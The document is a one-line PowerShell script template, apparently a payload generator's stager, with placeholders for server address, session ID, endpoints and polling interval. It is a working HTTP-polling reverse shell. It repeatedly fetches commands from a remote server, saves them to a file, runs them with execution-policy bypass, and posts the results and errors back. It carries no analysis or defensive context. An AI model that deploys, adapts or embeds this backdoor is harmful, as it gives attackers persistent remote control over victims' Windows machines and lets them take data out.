$s='*SERVERIP*';$i='*SESSIONID*';$p='https://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/*VERIFY* -Headers @{"*HOAXID*"=$i;"Bypass-Tunnel-Reminder"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/*GETCMD* -Headers @{"*HOAXID*"=$i;"Bypass-Tunnel-Reminder"=$i}).Content;if ($c -ne 'None') {echo "$c" | out-file -filepath *OUTFILE*;$r=powershell -ep bypass *OUTFILE* -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/*POSTRES* -UseBasicParsing -Method POST -Headers @{"*HOAXID*"=$i;"Bypass-Tunnel-Reminder"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep *FREQ*}
